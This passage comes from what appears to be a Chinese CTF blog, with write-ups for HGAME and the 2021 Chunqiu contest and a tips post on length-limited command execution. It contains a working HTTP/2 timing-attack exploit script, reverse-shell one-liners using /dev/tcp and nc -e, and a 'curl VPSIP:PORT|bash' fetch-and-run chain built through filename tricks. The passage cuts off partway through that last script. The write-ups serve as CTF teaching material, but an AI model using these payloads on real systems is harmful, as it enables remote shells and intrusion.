LOAD_FAST 1 (cipher) 124 LOAD_FAST 3 (i) 126 BINARY_SUBSCR 128 CALL_FUNCTION 1 130 LOAD_FAST 3 (i) 132 BINARY_XOR 134 CALL_METHOD 1 136 POP_TOP 138 JUMP_ABSOLUTE 112 15 &gt;&gt; 140 LOAD_GLOBAL 6 (bytes) 142 LOAD_FAST 4 (res) 144 CALL_FUNCTION 1 146 LOAD_METHOD 7 (hex) 148 CALL_METHOD 0 150 STORE_FAST 4 (res) 16 152 LOAD_GLOBAL 8 (print) 154 LOAD_CONST 6 ('your flag: ') 156 LOAD_FAST 4 (res) 158 BINARY_ADD 160 CALL_FUNCTION 1 162 POP_TOP 164 LOAD_CONST 0 (None) 166 RETURN_VALUE # your flag: 30466633346f59213b4139794520572b45514d61583151576638643a 然后照样子写出源码。 # # 源代码 # hgame{.+} raw_flag = input('give me your flag:\\n') cipher = list(raw_flag[6:-1]) length = len(cipher) for i in range(length // 2): cipher[2*i], cipher[2 * i + 1] = cipher[2 * i + 1], cipher[2*i] res=[] for i in range(length): res.append(ord(cipher[i]) ^ i) res = bytes(res).hex() print('your flag: ' + res) # your flag: 30466633346f59213b4139794520572b45514d61583151576638643a 好耶，直接就是奇偶位交换，然后异或一下，那直接反过来就完事了。 exp: # decode res = '30466633346f59213b4139794520572b45514d61583151576638643a' x = bytes.fromhex(res) length = len(x) cipher = [] for i in range(length): cipher.append(chr(x[i] ^ i)) for i in range(length // 2): cipher[2*i], cipher[2 * i + 1] = cipher[2 * i + 1], cipher[2*i] print(cipher) flag = ''.join(cipher) print(flag) # G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~ hgame{G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~} Extensive Reading: （整理）Python字节码详解 helloRe关键的部分在下图的第39行。 首先读取输入，然后与 sub_140001430 函数返回的结果进行异或，不对则输出 wrong flag。 再看 sub_140001430，返回的是 0xFF 递减的结果。 而 byte_140003480 是比对的部分。 于是写个脚本异或就完事了。 Exp: xx = \"\"\"97 99 ...\"\"\" x = xx.strip().split('\\n') x = [int(i.strip(), 16) for i in x] r = '' cnt = 0xff for i in x: r += chr(i ^ cnt) cnt -= 1 print(r) # hgame{hello_re_player} Pwnwhitegive签到题，源码都给了，好耶！ #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; void init_io() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } int main() { unsigned long long num; init_io(); printf(\"password:\"); scanf(\"%ld\", &amp;num); if (num == \"paSsw0rd\") { //Do you know strcmp? printf(\"you are right!\\n\"); system(\"/bin/sh\"); } else { printf(\"sorry, you are wrong.\\n\"); } return 0; } unsigned long long 和 char* 比较，看指针地址就好了。 0x402012 =&gt; 4202514 hgame{W3lCOme_t0_Hg4m3_2222Z222zO2l} 小结第一周 AK 了 Misc 和 Web，感觉题目还是挺有意思的。 喵呜，binary 好难不会做，嘤嘤嘤。 好快啊，这周就过年了喵~ （溜了溜了","path":"2021/02/07/CTF_2021HgameWeek1/"},{"title":"CTF | 2021 春秋杯 新年欢乐赛 WriteUp","text":"引言前几天有个 2021年“春秋杯”新年欢乐赛，总共有 10 道题，题目不分 misc/web/crypto/pwn/reverse/…，统称 Fungame。 题目由2020年技术热点事件类型题目、常规考点题目以及以往比赛0解且未公开writeup的题目组成。 本次比赛将采用全新的沙漏积分模式，沙漏积分模式是一种题目分值随着时间的增加而逐渐减少的积分模式，该积分模式的设定目的是为了激励选手争夺时间答题，提高CTF比赛的竞技性。沙漏积分模式下，题目分值的下降不会影响到之前得分者。 比赛时间：2021年1月29日10:00-1月31日17:00 积分啥的不关键，倒是对题目有点感兴趣就来看看了。 说好的欢乐赛，其实一点都不欢乐，太坏了！ 这里随意写写 WriteUp 好了。 签到 万物皆有”FUN”，电脑扫”FUN”活动，提供大写的”FUN”字样，即可获取flag~ （居然调用了摄像头 盲猜是识别到 FUN 就出 flag 了吧。 甚至还保存了一份 flag.txt 到目录下 233. flag{ju5t_f0r_FUN} 十二宫的挑衅 但愿你能解出密文，不然我就会继续犯罪:) 本题获取flag提交前请加上flag{} 首先抄了一份。。 ^#@$@#()/&gt;@?==%1( !)&gt;(*+3&lt;#86@-7$^. 4&amp;)8%#5&amp;6!=%1#$-$ +5&amp;?#!.03!%=@=101 0?(*~#??.+)%&amp;.7^8 =1%*^=$5$7@@8&gt;&amp;*9 9@0185(+7)&lt;%3#@^4 &amp;@@&lt;.)$3*#%%&lt;&lt;*++ .@.?=~**+!==65^@&amp; 查了一下 黄道十二宫杀手，可以看到去年12月密码信340 被破解的新闻。 当然还有解密的视频，Let’s Crack Zodiac - Episode 5 - The 340 Is Solved!（Youtube） 或者 黄道十二宫杀手的密码信「340」是怎么被破解的 （B站搬运，同上） 再或者 黄道十二宫连环杀手密码破译全过程（B站搬运，带翻译） 按照视频里的解密方法，依次错位往下读取得到以下字符。 （手解的好累，寻思着还不如写个脚本，做个循环再取个模就好了喵 ^&gt;%..@3*&amp;#(#0+@#+ .@*53)8@+@$+&amp;!%&gt;^ &amp;.@36%&amp;&amp;4@?#&lt;!=.* 9@=(#=@79@&lt;~)8%=^ =0.*/611811)*&gt;@#0 0%8$+@-$1?*53!?7- +(^(*==$$5*=+#==^ 4&amp;~$7%6%.&amp;?#5)%51 !)#?$&lt;&lt;^()8!?7%&lt;@ 再丢到 AZdecrypt 这个软件 里去解密，几秒钟就出来了。 草，这就是 flag 啊！ IKILLED A LOT OF PEOPLE AND THE PEOPLE I KILLED WILL BECOME SLAVES TO SERVE ME THIS IS FLAG WUUHUU TAKE OFF I HOPE YOU CAN DECRYPT IT AS SOON AS POSSIBLE OR I WILL CONTINUE TO COMMIT THE CRIME 最后发现提交的时候要连起来。 flag{WUUHUUTAKEOFF} snowww It’s really cold this winter, can you find what is hidden in snow 尾部拼接了一个 rar，提取出来，得到 MATLAB 源代码和数据。 encode.m: %% Run on Matlab2012b clc;clear;close all; alpha = 80; im = double(imread('original.jpg'))/255; mark = double(imread('watermark.png'))/255; imsize = size(im); TH=zeros(imsize(1)*0.5,imsize(2),imsize(3)); TH1 = TH; TH1(1:size(mark,1),1:size(mark,2),:) = mark; M=randperm(0.5*imsize(1)); N=randperm(imsize(2)); save('encode.mat','M','N'); for i=1:imsize(1)*0.5 for j=1:imsize(2) TH(i,j,:)=TH1(M(i),N(j),:); end end mark_ = zeros(imsize(1),imsize(2),imsize(3)); mark_(1:imsize(1)*0.5,1:imsize(2),:)=TH; for i=1:imsize(1)*0.5 for j=1:imsize(2) mark_(imsize(1)+1-i,imsize(2)+1-j,:)=TH(i,j,:); end end FA=fft2(im); FB=FA+alpha*double(mark_); FAO=ifft2(FB); imwrite(FAO,'snow.jpg'); 噢，是频域隐写了盲水印啊。 可以看到最后进行了 FFT 处理，M, N 数据也都给了，然后逆回去写脚本就好了。 另外注意到 mark_ 第一维的前半部分和后半部分是冗余的，随便取一部分就好了。 Payload: % Author: MiaoTony % Blog: https://miaotony.xyz clc;clear;close all; alpha = 80; im = double(imread('original.jpg'))/255; snow = double(imread('00000000.jpg'))/255; imsize = size(im); FA=fft2(im); FC=fft2(snow); mark_ = real((FC-FA)/alpha); TH = mark_(1:imsize(1)*0.5,1:imsize(2),:); TH1=zeros(imsize(1)*0.5,imsize(2),imsize(3)); load('encode.mat'); for i=1:imsize(1)*0.5 for j=1:imsize(2) TH1(M(i),N(j),:)=TH(i,j,:); end end imshow(TH1); imwrite(TH1,'mark.jpg'); 得到 mark 图片，图片有点黑，但 flag 挺清楚了，问题不大。 flag{c93fd2a3-103f-4539-9a51-ad5a6437daa1} 噢，原来 B乎上有文章介绍啊 emmm 还是2016年的事了。 阿里巴巴公司根据截图查到泄露信息的具体员工的技术是什么？ borrow_time I wanna borrow some time. [注：想法子访问到题目，加油。本题每隔30分钟自动重置。] http://8.140.110.118/ 直接访问得到的是一串 bit 流，emmm 什么玩意。 然后用 curl，发现让我用 HTTP0.9??? 访问得到下面的，就是那串 bit 流。 $ nc 8.140.110.118 80 | hexdump -C miaotony.xyz 00000000 00 00 12 04 00 00 00 00 00 00 03 00 00 00 80 00 |................| 00000010 04 00 01 00 00 00 05 00 ff ff ff 00 00 04 08 00 |................| 试了一下发现这个是 HTTP2，但是浏览器一般都是从 HTTP1.1 协商升级到 HTTP2 的而不是直接请求 HTTP2的，于是就访问不到了。 具体可以看下面的对比。 # curl --http2-prior-knowledge http://8.140.110.118/ -v * Trying 8.140.110.118:80... * Connected to 8.140.110.118 (8.140.110.118) port 80 (#0) * Using HTTP2, server supports multi-use * Connection state changed (HTTP/2 confirmed) * Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0 * Using Stream ID: 1 (easy handle 0x2795195f000) &gt; GET / HTTP/2 &gt; Host: 8.140.110.118 &gt; user-agent: curl/7.73.0 &gt; accept: */* &gt; * Connection state changed (MAX_CONCURRENT_STREAMS == 128)! &lt; HTTP/2 200 &lt; server: nginx/1.17.10 &lt; date: Sat, 30 Jan 2021 11:29:47 GMT &lt; content-type: text/html; charset=utf-8 &lt; content-length: 505 &lt; &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/login.css\"/&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"login\"&gt; &lt;h1&gt;Login&lt;/h1&gt; &lt;form method=\"post\"&gt; &lt;input type=\"password\" required=\"required\" placeholder=\"口令\" name=\"secret\"&gt;&lt;/input&gt; &lt;button class=\"but\" type=\"submit\"&gt;登录&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;!-- /src --&gt;* Connection #0 to host 8.140.110.118 left intact 访问 /src 得到源码： #!/usr/bin/env python import os import time import hashlib from flask import Flask, render_template, request app = Flask(__name__) FLAG = os.environ[\"ICQ_FLAG\"] SECRET = hashlib.sha1(FLAG.encode()).hexdigest()[:10] SLEEP_TIME = 10 ** -10 @app.route(\"/\", methods=['POST', 'GET']) def login(): if request.method == 'GET': return render_template('login.html') else: secret = request.form['secret'] if len(secret) != len(SECRET): return \"^_^\" for a, b in zip(secret, SECRET): if a == \"*\": continue elif a != b: return \"INCORRECT\" else: time.sleep(SLEEP_TIME) if \"*\" in secret: return \"INCORRECT\" return FLAG @app.route(\"/src\") def src(): with open(__file__) as f: return f.read() 于是就是基于时间的盲注了吧，每一位的字符可以单独进行遍历，正合题意 borrow time。 然后发现了类似的题目，就是 WCTF 2020 一道题目改的。 参考： https://github.com/ConnorNelson/spaceless-spacing https://github.com/DistriNet/timeless-timing-attacks 这道题把 GET 改成 POST 了，跳过的字符由 （空格）改成了 *，需要改一下 exploit。 这个 TIMING_ITERATIONS，NUM_REQUEST_PAIRS 需要改大一点，不然两个请求同时发出去没啥区别…… 以及 http://8.140.110.118:80 要把端口给指定好，通过审计源码发现 H2Request 和 HTTP20Connection 里面接口封装的不一样，会有点问题，或者传个 port 参数进去也可。 Payload: (h2time 参考上面的 repo) import os import asyncio import time import string import logging from hyper import HTTP20Connection from h2time import H2Time, H2Request # Number of requests: TIMING_ITERATIONS * NUM_REQUEST_PAIRS * 2 * |SECRET_CHARSET| * |SECRET| TIMING_ITERATIONS = 2 # 3 NUM_REQUEST_PAIRS = 20 # 20 SECRET_CHARSET = 'abcdef' + string.digits COMPARISON_CHAR = \"x\" # This must not be in SECRET_CHARSET # target = os.environ[\"TARGET\"].rstrip(\"/\") target = \"http://8.140.110.118:80\" logging.basicConfig(level=logging.INFO) logger = logging.getLogger(\"exploit\") def get(resource): logging.disable(logging.INFO) try: connection = HTTP20Connection( target.lstrip(\"http://\").lstrip(\"https://\")) # , port=80 connection.request( \"POST\", \"/\", body=f\"secret={resource}\", headers={\"user-agent\": \"curl/7.73.0\", \"content-type\": \"application/x-www-form-urlencoded\"}) return connection.get_response().read() finally: logging.disable(logging.DEBUG) async def time_difference(a, b): request_a = H2Request(\"POST\", f\"{target}/\", headers={\"user-agent\": \"curl/7.73.0\", \"content-type\": \"application/x-www-form-urlencoded\"}, data=f\"secret={a}\") request_b = H2Request(\"POST\", f\"{target}/\", headers={\"user-agent\": \"curl/7.73.0\", \"content-type\": \"application/x-www-form-urlencoded\"}, data=f\"secret={b}\") a_quicker_count = 0 b_quicker_count = 0 for _ in range(TIMING_ITERATIONS): async with H2Time( request_a, request_b, num_request_pairs=NUM_REQUEST_PAIRS ) as h2t: results = await h2t.run_attack() b_quicker_count += len([result for result in results if result[0] &lt; 0]) a_quicker_count += len([result for result in results if result[0] &gt;= 0]) async with H2Time( request_b, request_a, num_request_pairs=NUM_REQUEST_PAIRS ) as h2t: results = await h2t.run_attack() a_quicker_count += len([result for result in results if result[0] &lt; 0]) b_quicker_count += len([result for result in results if result[0] &gt;= 0]) return a_quicker_count, b_quicker_count async def exploit(): # secret_length = 1 # while get(COMPARISON_CHAR * secret_length) == b\"^_^\": # secret_length += 1 secret_length = 10 logger.info(\"\") logger.info(f\"Secret Length: {secret_length}\") logger.info(\"\") secret = \"\" for _ in range(secret_length): start = time.time() def spaced_secret_guess(guess): return \"*\" * len(secret) + guess + \"*\" * (secret_length - len(secret) - 1) tasks = { char: asyncio.create_task( time_difference( spaced_secret_guess( COMPARISON_CHAR), spaced_secret_guess(char) ) ) for char in SECRET_CHARSET } await asyncio.gather(*tasks.values()) lowest_char_quicker = None lowest_char_quicker_count = float(\"inf\") for char, task in tasks.items(): comparison_quicker_count, char_quicker_count = task.result() if char_quicker_count &lt; lowest_char_quicker_count: lowest_char_quicker = char lowest_char_quicker_count = char_quicker_count logger.info( f\"Tested: {secret + char} -- {comparison_quicker_count} {char_quicker_count}\" ) secret += lowest_char_quicker end = time.time() logger.info(\"\") logger.info(f\"Secret Progress: {secret}\") logger.info(f\"Secret Progress took: {end - start}s\") logger.info(\"\") correct = get(f\"{secret}\") # == b\"CORRECT!\" logger.info(\"\") logger.info(f\"Secret: {secret}\") logger.info(f\"Correct: {correct}\") logger.info(\"\") loop = asyncio.get_event_loop() loop.run_until_complete(exploit()) loop.close() 然而，不知道为什么我在 Win10 下跑结果居然没啥区别，真的两个不同字母的请求发出去结果几乎对半分，喵喵喵？ 最后干脆直接到 Ubuntu 下拉 docker 镜像本地先复现了一遍，发现在 Ubuntu 下就没问题，换 Win10 打过去不行。 于是干脆 Docker 起个 exploit 打远程好了。（记得改 exploit.py） docker build -t spaceless-spacing-exploit -f Dockerfile.exploit . docker run -it --rm --network=host -e TARGET='http://8.140.110.118:80' spaceless-spacing-exploit 多试几次，或者再把 TIMING_ITERATIONS，NUM_REQUEST_PAIRS 改大一点。 f865c31f7e f160cddbc9 fe65c0d8ab 311fc0d2c9 81f3ccd8c9 f16522c8c9 f165c0d8c9 f1d5c3d8cc 比较一下，再试一试，得出 f165c3d8c9 curl --http2-prior-knowledge http://8.140.110.118/ -v -d \"secret=f165c3d8c9\" 得到 flag。 flag{a8a00a86-46cb-4959-8b26-e4c8cf15b375} puzzle 拼图的好处： 1、动手又动脑，开发智力，增加几何空间感 2、你可以在拼好后的作品上发挥想象，绘上与众不同的色彩，这样，你的作品就成了独一无二的艺术品了。 3、与家人或朋友一起拼装，增加了交流，增进感情与亲情 这么多的益处，所以赶紧来玩吧~ raw: 1920x1080 piece: 160x120 12x9 但是给了1125张碎片，可见巨多冗余数据，发现是每移动一点截一张这样的，太坏了。 风格是这样的。 当然原图还不错。 于是先把带有字符的图片挑选出来，然后打开 PPT，开始拼图。 加了一堆噪声，太坏了！！！ 叠上原图看看。 调一下颜色…… 太难受了啊！ 再试试反色和二值化。 import os from PIL import Image import cv2 os.chdir(\"/path/to/the/puzzle/\") filename = os.listdir(\"output/\") # 获取目录下所有图片名 # print(filename) # os.listdir() # 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。 base_dir = \"output/\" # input new_dir = \"threshold/\" # output for img in filename: name = img print(img) img = cv2.imread(base_dir + str(img)) height,width,temp = img.shape img2 = img.copy() for i in range(height): for j in range(width): # 反色 img2[i,j] = (255-img[i,j][0],255-img[i,j][1],255-img[i,j][2]) cv2.imwrite(new_dir + name, img2) # Grayimg = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) # cv2.imwrite(new_dir + name, Grayimg) # 二值化 # ret, thresh = cv2.threshold(Grayimg, 60, 255, cv2.THRESH_BINARY) # cv2.imwrite(new_dir + name, thresh) 后来又再群友提示下，实现了用 Photoshop 批量处理。（学多 当然最后还是没找全/没试对，眼睛要瞎了…… 最后的 flag 是这个↓，字母长得太丑了，图片太花了，真认不出来。。 flag{w9w45my6x8kk4e8gp9nqm6j2c154wad49} （越想越觉得，这种拼图题目真没啥意思 old_driver 随着深度学习技术的发展，基于深度学习技术的自动驾驶已经成为了当下一大热门。但深度学习很容易受到对抗样本的攻击，这也会为自动驾驶带来安全隐患。附件中给出了一个路标识别系统的模型和一些输入的路标图片，在输入的路标中被黑客混入了一些对抗样本，你能否帮忙检测出其中的对抗样本呢？ Note: 数据集文件夹名为ground truth label，而不是模型输出。 附件下载 提取码（GAME） 又是 AI 题啊（（ （这题比赛的时候没怎么看，来复现一下 attack.py 源码 from glob import glob import torch from torch import nn, optim import torch.nn.functional as F import torchattacks # https://github.com/Harry24k/adversarial-attacks-pytorch from torchvision import transforms from PIL import Image import random import os from hashlib import md5, sha256 class Model(nn.Module): def __init__(self): super(Model, self).__init__() self.conv1 = nn.Conv2d(3, 100, 5) self.conv1_bn = nn.BatchNorm2d(100) self.pool = nn.MaxPool2d(2, 2) self.conv2 = nn.Conv2d(100, 150, 3) self.conv2_bn = nn.BatchNorm2d(150) self.conv3 = nn.Conv2d(150, 250, 1) self.conv3_bn = nn.BatchNorm2d(250) self.fc1 = nn.Linear(250 * 3 * 3, 350) self.fc1_bn = nn.BatchNorm1d(350) self.fc2 = nn.Linear(350, 10) self.dropout = nn.Dropout(p=0.5) def forward(self, x): x = self.pool(F.elu(self.conv1(x))) x = self.dropout(self.conv1_bn(x)) x = self.pool(F.elu(self.conv2(x))) x = self.dropout(self.conv2_bn(x)) x = self.pool(F.elu(self.conv3(x))) x = self.dropout(self.conv3_bn(x)) x = x.view(-1, 250 * 3 * 3) x = F.elu(self.fc1(x)) x = self.dropout(self.fc1_bn(x)) x = self.fc2(x) return x # load pretrained model device = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\") transform = transforms.ToTensor() model = Model().to(device) check_point = torch.load('model.pt', map_location=device) model.load_state_dict(check_point) model.eval() # untargeted CW attack atk = torchattacks.CW(model, c=1, kappa=0.3) # generate an adversarial example for each class pairs = [] for cl in range(10): while True: origin_image = random.choice(glob(f'test/{cl}/*.png')) image = transform(Image.open(origin_image)).to(device)[None, ...] label = torch.tensor(cl, device=device) adv_image = atk(image, label) origin_output = model(image) adv_output = model(adv_image) origin_label = torch.argmax(origin_output, axis=1).item() adv_label = torch.argmax(adv_output, axis=1).item() if adv_label == origin_label: continue transforms.ToPILImage()(adv_image[0]).save(f'adv_{origin_label}_{adv_label}.png') # confirm that the generated adversarial example is working image = transform(Image.open(f'adv_{origin_label}_{adv_label}.png')).to(device)[None, ...] output = model(image) if torch.argmax(output, axis=1).item() != adv_label: continue pairs.append((origin_image, f'adv_{origin_label}_{adv_label}.png', origin_label, adv_label)) break # remove origin images and move adversarial examples into target classes for origin_fname, adv_fname, origin_label, adv_label in pairs: os.rename(adv_fname, f'test/{adv_label}/{adv_fname}') os.remove(origin_fname) # shuffle all the images to hide adversarial examples os.mkdir('imgs') adversarial_images = [] for cl in range(10): images = glob(f'test/{cl}/*.png') os.mkdir(f'imgs/{cl}') random.shuffle(images) for idx, image in enumerate(images): os.rename(image, f'imgs/{cl}/{idx}.png') if 'adv' in image: adversarial_images.append(idx) # You can get the flag if you find all the adversarial examples :) flag = 'flag{' + md5(str(sorted(adversarial_images)).encode()).hexdigest() + '}' # Give you some hints though you can solve this challenge without them hint1 = [(row[2], row[3]) for row in pairs] hint2 = sha256(str(sorted(adversarial_images)).encode()).hexdigest() print('flag:', flag) print('hint1:', hint1) print('hint2:', hint2) # flag: flag{*********REDACTED**********} # hint1: [(0, 1), (1, 0), (2, 6), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7), (9, 1)] # hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9 可以看到用 Pytorch 搭了一个模型，生成对抗样本，然后确保生成的样本落入到模型的另一个分类中，而后将对抗样本保存，改名并移除原图。 （顺手把 Pytorch 装了，喵呜，有点大还挺久 pairs 是一个元组，分别是 (origin_fname, adv_fname, origin_label, adv_label)，即原图和对抗样本的文件路径、相应的标签。 看一下 imgs/ 目录下的图片，这个居然真的肉眼就能找出区别…… 尽管打乱了图片的顺序，但是由于 rename 并没有影响文件的修改时间，而这些对抗样本是后面保存/创建的，于是直接按照时间排序就能找出是哪些对抗样本。这也是很多非预期解的方法。 试了一下，果然可以…… Exp: from hashlib import md5, sha256 # flag: flag{*********REDACTED**********} # hint1: [(0, 1), (1, 0), (2, 6), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7), (9, 1)] # hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9 adversarial_images = [34, 171, 128, 116, 273, 293, 214, 391, 59, 127] hint2 = sha256(str(sorted(adversarial_images)).encode()).hexdigest() print('hint2:', hint2) flag = 'flag{' + md5(str(sorted(adversarial_images)).encode()).hexdigest() + '}' print('flag:', flag) # hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9 # flag: flag{00d531934c171e1a71405f5e1f171d65} 预期解可以参考这一篇 春秋杯2021新年欢乐赛ai题old_driver详解 主要有三个条件： 识别结果前两名评分差距小 识别结果第二名评分高 对照 hint1，评分前两名是已知的 =&gt; 不正确的跳过 在他的 exp 基础上稍微改了下，复现成功。 2019-nCoV 增加hint.txt下载 可用python统计次数最多的字符 老套娃题了，来复现一下。 hint.txt NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE====== base32 =&gt; http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.html https://www.ncbi.nlm.nih.gov/orffinder/ http://www.merrybio.com.cn/blog/coronavirus-introduction.html Please notice The largest structural protein the password is the md5(it's gene sequence) and do not let the ‘\\n’ in md5() 关注最大的结构蛋白，password 是基因序列的 md5。 去看登录号为 MN908947 的全基因组序列。 按照第一篇中的思路，利用 NCBI 上的 ORF finder 工具对该病毒（MN908947) 进行基因组注释分析。 $ cat protein.txt|awk '{printf(\"%s\",$0)}'|md5sum 98eb1b1760bcc837934c8695a1cee923 *- MP3stego 解 cov.mp3 MP3StegoDecode.exe -X -P 98eb1b1760bcc837934c8695a1cee923 cov.mp3 得到 realflag.zip 密码 2019-nCoV。 解压 =&gt; hint2.txt 以及 CoV-1.jpg 796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154 base16 =&gt; you must pay attention to N protein ,How do that get into the viral capsid? do you know steghide? the password is encrypt by Vigenère Cipher the screct key is The top 20 characters with the most occurrences are counted+COMBAT 再回到第一张图里的 核衣壳蛋白（nucleoprotein，N），它如何进入病毒衣壳内？ 要结合 M、E蛋白。 这里好坑啊，要把这三个蛋白一起合并。 统计一下出现次数最多的20个字符。 s = \"\"\"MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA SWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK MKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN PANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG SSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS AAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH WPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV ILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL DDFSKQLQQSMSSADSTQA MADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK LIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF RLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLR IAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYR IGNYKLNTDHSSSSDNIALLVQ MFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS QLDEEQPMEID\"\"\" s = s.strip().replace('\\n', '') d = {} for i in s: if i not in d: d[i] = 1 else: d[i] += 1 print(d) # {'M': 14, 'S': 56, 'D': 34, 'N': 37, 'G': 57, 'P': 34, 'Q': 42, 'R': 44, 'A': 57, 'I': 44, 'T': 48, 'F': 27, 'E': 24, 'K': 42, 'L': 70, 'W': 13, 'H': 10, 'V': 23, 'Y': 22, 'C': 4} l = sorted(d.items(), key=lambda x: x[1], reverse=True) print(l) r='' for i in l: r += i[0] print(r[:20]) # LGASTRIQKNDPFEVYMWHC # LGASTRIQKNDPFEVYMWHCCOMBAT 用 SilentEye 对 pass.wav 解密一下。 得到 password priebeijoarkjpxmdkucxwdus。 然后用 出现最多的20个字符 + COMBAT，即 LGASTRIQKNDPFEVYMWHCCOMBAT 这个密钥 Vigenère 解密 password。 得到最终的 password：eliminatenovelcoronavirts 最后 steghide 解密图片。 steghide extract -p eliminatenovelcoronavirts -v -sf CoV-1.jpg flag{we_will_over_come_SARS-COV} （老套娃了 调查问卷 flag{xinnianfunfunfun} 小结说好的欢乐赛呢，欢乐都是主办方和出题人的，嘤嘤嘤，太坏了（ 除了偏向 binary 类型的 evilMem 和 Super Brain，还有个 按F注入。是个 PostgreSQL 的注入，还没做过类似的唉，有点意思，后面再来复现吧，喵喵~ （溜了溜了喵","path":"2021/02/03/CTF_2021chunqiu/"},{"title":"CTF | 限制长度下的命令执行 技巧汇总","text":"前言最近打 CTF 的时候遇到了个 命令执行 的 web 题目，但是它限制了命令的长度。 于是查了一些资料，正好就来总结一下一些相关的小技巧吧，喵~ 默认排序ls 默认的排序是按照字母顺序来的，一个一个字符来看，| =&gt; 空格 =&gt; 数字 =&gt; 字母。 以 - 开头的文件名不看 -，从之后的第一个字符开始比较。 一些 tricks Linux 下可以用 \\ 来拼接命令，实现命令续行，生成文件的话文件名要双写 \\\\，比如 &gt;ls\\\\。 注意不要用 . 作为文件名的开头，因为 Linux 下 . 会作为隐藏文件，直接用 ls 列不出来。 为了不按照默认顺序排序，可以用 ls -t，按照时间顺序，后执行的排前面，于是可以拆分命令再拼接来实现。 dir a b&gt;c 只会将 a b 写到文件 c 中，而其他的文件则不会。 用 * 可以得到当前目录下的所有目录及文件名，而且能用文件名执行命令。 利用 rev 命令可以执行反序，先生成一个名为 rev 的文件，再执行 *v，由于 Linux 的通配符，就相当于执行了 rev v，太妙了！ 还可以用 ls -th，-h 不影响执行，但 ht- 就能排到 sl 前面去，搭配 *v 使用更好了。 -h, –human-readable with -l and -s, print sizes like 1K 234M 2G etc. PHP 代码执行 exec 时，只需要输入\\ 即可生成 \\\\，比如 exec(\"&gt;ls\\\") 即可，还能省一个字符呢。 反弹 shell 时候用的 IP 可以换成十进制不带小数点的。（噢你有短域名啊，没事了） 可以依次执行 &gt;env, *&gt;x，相当于执行 env&gt;x，就能在 x 文件里得到环境变量里的内容。 参考 Payload这个是反弹 shell 的思路。 最开始需要在 VPS 某个页面上放个反弹 shell 的脚本。 bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1 # 或者 nc -e /bin/sh VPSIP PORT 然后起个服务监听这个端口。 nc -lvvp PORT 要被打的机器上，先生成 ls -th &gt; g，而后文件名拼接实现 curl VPSIP:PORT|bash，然后执行 sh x 生成反弹的命令，最后 sh g 触发命令执行，在 VPS 上拿到 shell。 # coding: utf-8 import requests from urllib.parse import quote baseurl = \"http://207.180.200.166:8000/?cmd=\" reset = \"http://207.180.200.166:8000/?reset\" s = requests.session() s.get(reset) # 文件 x 内容为 ls -th &gt; g list1 = [ \"&gt;sl\", \"&gt;ht-\", \"&gt;g\\&gt;\", \"&gt;dir\", \"*&gt;v\", \"&gt;rev\", \"*v&gt;x\" ] # curl VPSIP:PORT|bash list2 = [ \"&gt;bash\", \"&gt;\\|\\\\\", \"&gt;11\\\\\", \"&gt;11\\\\\", 